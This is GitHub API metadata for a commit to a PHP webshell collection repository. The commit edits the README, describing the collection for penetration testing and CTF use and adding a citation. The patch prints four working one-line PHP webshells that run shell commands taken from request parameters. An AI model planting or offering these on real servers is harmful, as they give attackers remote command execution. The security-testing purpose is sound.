@@ -1,0 +1,101 @@
+{
+  "sha": "226a15d0684e2f893caed0b94fbbf0037b89adea",
+  "node_id": "MDY6Q29tbWl0MjIyNzE1NTM6MjI2YTE1ZDA2ODRlMmY4OTNjYWVkMGI5NGZiYmYwMDM3Yjg5YWRlYQ==",
+  "commit": {
+    "author": {
+      "name": "John (Troon) Ombagi",
+      "email": "jayombagi@gmail.com",
+      "date": "2020-04-11T00:44:50Z"
+    },
+    "committer": {
+      "name": "John (Troon) Ombagi",
+      "email": "jayombagi@gmail.com",
+      "date": "2020-04-11T00:44:50Z"
+    },
+    "message": "Update and include citation",
+    "tree": {
+      "sha": "e44d1f9538f85fdb79c30a65800287fd61985ef9",
+      "url": "https://api.github.com/repos/JohnTroony/php-webshells/git/trees/e44d1f9538f85fdb79c30a65800287fd61985ef9"
+    },
+    "url": "https://api.github.com/repos/JohnTroony/php-webshells/git/commits/226a15d0684e2f893caed0b94fbbf0037b89adea",
+    "comment_count": 0,
+    "verification": {
+      "verified": false,
+      "reason": "unsigned",
+      "signature": null,
+      "payload": null,
+      "verified_at": null
+    }
+  },
+  "url": "https://api.github.com/repos/JohnTroony/php-webshells/commits/226a15d0684e2f893caed0b94fbbf0037b89adea",
+  "html_url": "https://github.com/JohnTroony/php-webshells/commit/226a15d0684e2f893caed0b94fbbf0037b89adea",
+  "comments_url": "https://api.github.com/repos/JohnTroony/php-webshells/commits/226a15d0684e2f893caed0b94fbbf0037b89adea/comments",
+  "author": {
+    "login": "JohnTroony",
+    "id": 4489002,
+    "node_id": "MDQ6VXNlcjQ0ODkwMDI=",
+    "avatar_url": "https://avatars.githubusercontent.com/u/4489002?v=4",
+    "gravatar_id": "",
+    "url": "https://api.github.com/users/JohnTroony",
+    "html_url": "https://github.com/JohnTroony",
+    "followers_url": "https://api.github.com/users/JohnTroony/followers",
+    "following_url": "https://api.github.com/users/JohnTroony/following{/other_user}",
+    "gists_url": "https://api.github.com/users/JohnTroony/gists{/gist_id}",
+    "starred_url": "https://api.github.com/users/JohnTroony/starred{/owner}{/repo}",
+    "subscriptions_url": "https://api.github.com/users/JohnTroony/subscriptions",
+    "organizations_url": "https://api.github.com/users/JohnTroony/orgs",
+    "repos_url": "https://api.github.com/users/JohnTroony/repos",
+    "events_url": "https://api.github.com/users/JohnTroony/events{/privacy}",
+    "received_events_url": "https://api.github.com/users/JohnTroony/received_events",
+    "type": "User",
+    "user_view_type": "public",
+    "site_admin": false
+  },
+  "committer": {
+    "login": "JohnTroony",
+    "id": 4489002,
+    "node_id": "MDQ6VXNlcjQ0ODkwMDI=",
+    "avatar_url": "https://avatars.githubusercontent.com/u/4489002?v=4",
+    "gravatar_id": "",
+    "url": "https://api.github.com/users/JohnTroony",
+    "html_url": "https://github.com/JohnTroony",
+    "followers_url": "https://api.github.com/users/JohnTroony/followers",
+    "following_url": "https://api.github.com/users/JohnTroony/following{/other_user}",
+    "gists_url": "https://api.github.com/users/JohnTroony/gists{/gist_id}",
+    "starred_url": "https://api.github.com/users/JohnTroony/starred{/owner}{/repo}",
+    "subscriptions_url": "https://api.github.com/users/JohnTroony/subscriptions",
+    "organizations_url": "https://api.github.com/users/JohnTroony/orgs",
+    "repos_url": "https://api.github.com/users/JohnTroony/repos",
+    "events_url": "https://api.github.com/users/JohnTroony/events{/privacy}",
+    "received_events_url": "https://api.github.com/users/JohnTroony/received_events",
+    "type": "User",
+    "user_view_type": "public",
+    "site_admin": false
+  },
+  "parents": [
+    {
+      "sha": "3275ca03e7ce4d5e377a2baf4ac38f2ed91f4c2c",
+      "url": "https://api.github.com/repos/JohnTroony/php-webshells/commits/3275ca03e7ce4d5e377a2baf4ac38f2ed91f4c2c",
+      "html_url": "https://github.com/JohnTroony/php-webshells/commit/3275ca03e7ce4d5e377a2baf4ac38f2ed91f4c2c"
+    }
+  ],
+  "stats": {
+    "total": 47,
+    "additions": 33,
+    "deletions": 14
+  },
+  "files": [
+    {
+      "sha": "c40f173ad7da9d154bc9ae6f145041bc8013ec95",
+      "filename": "README.md",
+      "status": "modified",
+      "additions": 33,
+      "deletions": 14,
+      "changes": 47,
+      "blob_url": "https://github.com/JohnTroony/php-webshells/blob/226a15d0684e2f893caed0b94fbbf0037b89adea/README.md",
+      "raw_url": "https://github.com/JohnTroony/php-webshells/raw/226a15d0684e2f893caed0b94fbbf0037b89adea/README.md",
+      "contents_url": "https://api.github.com/repos/JohnTroony/php-webshells/contents/README.md?ref=226a15d0684e2f893caed0b94fbbf0037b89adea",
+      "patch": "@@ -1,30 +1,49 @@\n Contributing\n ============\n+\n To contribute other shells not listed here... Fork, Push the changes to your repo, then before you request for a Pull, make sure to include a simple description of your **php** web-shell and include a screen-shot of the web-shell (as hosted in your localhost).\n \n-php-webshells\n+PHP Webshells\n =============\n \n-Common PHP shells. Do not put these on a publicly-accessible webserver.\n+Common PHP shells is a collection of PHP webshells that you may need for your penetration testing (PT) cases or in a CTF challenge. \n+\n+Do not host any of the files on a publicly-accessible webserver (unless you know what you are up-to).\n+\n+These are provided for education purposes only and legitimate PT cases.\n+\n+I'll keep updating the collection whnever I stumble on any new webshell.\n+\n+FYI\n+====\n \n-These are provided for education purposes only.\n \n-Common php webshells. Do not host the file(s) in your server!\n+For basic features, I recommend one-liners like :\n \n-++++++++++++++++++++++++++\n+`<?php echo passthru($_GET['cmd']); ?>`\n \n-Though I recommend one-liners like \n+`<?php echo exec($_POST['cmd']); ?>`\n \n-<?php echo passthru($_GET['cmd']); ?>\n+`<?php system($_GET['cmd']); ?>`\n \n-(Not a full fledged webshell, but works fine)\n+`<?php passthru($_REQUEST['cmd']); ?>`\n \n-=================================================================\n \n-You can try WebHandler for one-liners.\n+Cite:\n+=====\n \n-WebHandler.py works for POST and GET requests:\n+```\n+@software{jacques_pharand_2020_3748072,\n+  author       = {Jacques Pharand and\n+                  John Troon and\n+                  Javier Izquierdo Vera},\n+  title        = {JohnTroony/php-webshells: Collection CS1},\n+  month        = apr,\n+  year         = 2020,\n+  publisher    = {Zenodo},\n+  version      = {1.1},\n+  doi          = {10.5281/zenodo.3748072},\n+  url          = {https://doi.org/10.5281/zenodo.3748072}\n+}\n \n-    <?php system($_GET['cmd']); ?>\n-    <?php passthru($_REQUEST['cmd']); ?>\n-    <?php echo exec($_POST['cmd']); ?>\n+```"
+    }
+  ]
+}
